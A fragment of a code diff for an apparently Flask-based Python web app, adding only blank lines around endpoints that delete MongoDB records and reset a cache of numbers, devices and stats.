             cache["msg_cache_time"] = {}
             cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
             cache["fb_stats"] = {}
+
         threading.Thread(target=refresh_cache, daemon=True).start()
         return jsonify({"success": True})
     except Exception as e:
@@ -3486,6 +3314,7 @@ def api_fb_bulk_delete():
             deleted += res.deleted_count
         except Exception:
             pass
+
     with cache["lock"]:
         cache["numbers_map"] = {}
         cache["devices"] = {}
@@ -3493,6 +3322,7 @@ def api_fb_bulk_delete():
         cache["msg_cache_time"] = {}
         cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
         cache["fb_stats"] = {}
+
     threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True, "deleted": deleted})
 
@@ -3504,6 +3334,7 @@ def api_fb_delete_all():
         return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
         res = fb_collection.delete_many({})
+
         with cache["lock"]:
             cache["numbers_map"] = {}
             cache["devices"] = {}
@@ -3511,6 +3342,7 @@ def api_fb_delete_all():
             cache["msg_cache_time"] = {}
             cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
             cache["fb_stats"] = {}
+
         threading.Thread(target=refresh_cache, daemon=True).start()
         return jsonify({"success": True, "deleted": res.deleted_count})
     except Exception as e:
